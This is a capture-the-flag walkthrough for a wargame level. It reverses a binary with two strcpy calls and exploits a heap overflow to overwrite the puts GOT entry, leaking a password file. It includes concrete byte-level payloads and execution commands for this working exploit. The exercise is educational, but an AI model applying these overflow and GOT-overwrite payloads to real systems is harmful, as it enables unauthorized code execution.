# Walkthrough

## Reversing

```c
int main(int argc,char **argv)
{
  int *puVar1;
  void *pvVar2;
  int *puVar3;
  FILE *__stream;

  puVar1 = (undefined4 *)malloc(8);
  *puVar1 = 1;
  pvVar2 = malloc(8);
  puVar1[1] = pvVar2;

  puVar3 = (undefined4 *)malloc(8);
  *puVar3 = 2;
  pvVar2 = malloc(8);
  puVar3[1] = pvVar2;

  strcpy((char *)puVar1[1],argv[1]);
  strcpy((char *)puVar3[1],argv[2]);
  __stream = fopen("/home/user/level8/.pass","r");
  fgets(c,68,__stream);
  puts("~~");
  return 0;
}

void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  time_t tVar1;

  tVar1 = time((time_t *)0x0);
  printf("%s - %d\n",c,tVar1);
  return;
}
```

Another `strcpy`, but this seems like it will take more than 5 minutes... We'll
see.

Or not, we can see that it allocates 4 pointers:
- `puVar1`.
- `pvVar2`.
- `puVar3`.
- `pvVar2` (again).

All with a size of 8, we can assume `puVar1` and `puVar3` are integers arrays
of two elemenst, since their size is 4.

It initializes `puVar1` and `puVar3` to `pvVar2`.

And then it copies arguments to the first element of `puVar1` and the first
element of `puVar3`, so since they were initialized to `pvVar2`, the `strcpy`
is overwriting that address, treating the integer as an address.

So, in the first `strcpy` we can overflow it to write an arbitatry address
to `puVar3[1]`, so the next `strcpy`.

So, given the following scheme:
- `puVar1[1]` -> `pvVar2`.
- `puVar3[1]` -> `pvVar2` (second pvVar2 allocation).

The first `strcpy` copies to `pvVar2`, and -in memory- after `pvVar2` is
`puVar3`, so we can overflow `pvVar2` to point `puVar3` to something different.

And in the next `strcpy` we would write `argv[2]` to that arbitatry address.

So, we'll try to overwrite the address of the pointer of that `puts`, I don't
know if it's the intended method, because we have another function (`m`), that
prints `c`.

## A sad try

Let's print the pointers address with gdb, just put breakpoints after the
`malloc` and print `$eax`:
- `puVar1`: `0x804a008`.
- `pvVar2`: `0x804a018`.
- `puVar3`: `0x804a028`.
- `pvVar2`: `0x804a038`.

Get the distance between them:
```bash
echo 'ibase=16;804A018-804A008' | bc
16
echo 'ibase=16;804A028-804A018' | bc
16
echo 'ibase=16;804A038-804A028' | bc
16
```
That means `8` bytes plus `8` offset bytes.

On the other hand, this is the code that calls `puts`, as you see, it first
puts the address of the string `"~~"` as the first argument, our goal is to
overwrite that address to the address of `c`, so, to change the bytes of the
address, we need to change the last 4 bytes of this `MOV` 7 bytes instruction,
so the address will be: "`080485f0` + `3`":
```raw
080485f0 c7 04 24        MOV        dword ptr [ESP]=>local_30,DAT_08048703           = 7Eh    ~
         03 87 04 08
080485f7 e8 04 fe        CALL       <EXTERNAL>::puts                                 int puts(char * __s)
         ff ff
```

So, to make the first `strcpy` write an arbitatry address to `puVar3`, we need:
- `8` allocated bytes + `8` offset bytes + `4` bytes because we are changing the second element: `puVar3[1]`.
- `080485f3` address where the `puts` `char*` argument is set.

And as the second argument, we will what we want to write in that address,
that will be of course, the address of `c` (use `nm`: `08049960`).

So the payload will look like:
```bash
argv1=$(printf 'AAAAAAAAAAAAAAAAAAAA\xf3\x85\x04\x08')
argv2=$(printf '\x60\x99\x04\x08')
```

And execute:
```bash
./level7 "${argv1}" "${argv2}"
```

And of course this segfaults... We can't edit the binary .text section I think,
so let's go for the second approach.

## Exploit

Let's follow the same principle, but instead, let's replace the dynamically
linked `puts` GOT entry with `m`, we already have a method for writing an
arbitrary data to an arbitrary address, so let's write the address of `m` to
the `puts` GOT entry.

Take the addresses:
- `m` (with `nm`): `080484f4`.
- `puts` GOT (search in the `.got.plt` section): `08049928`.

And now, the payload and execution:
```bash
# remember the little endian!
argv1=$(printf 'AAAAAAAAAAAAAAAAAAAA\x28\x99\x04\x08')
argv2=$(printf '\xf4\x84\x04\x08')

./level7 "${argv1}" "${argv2}"
```

And that's it! Another flag, let's goooooo!

Of course the `./resources/expoit.sh` is there, it's important to automate
the exploits.
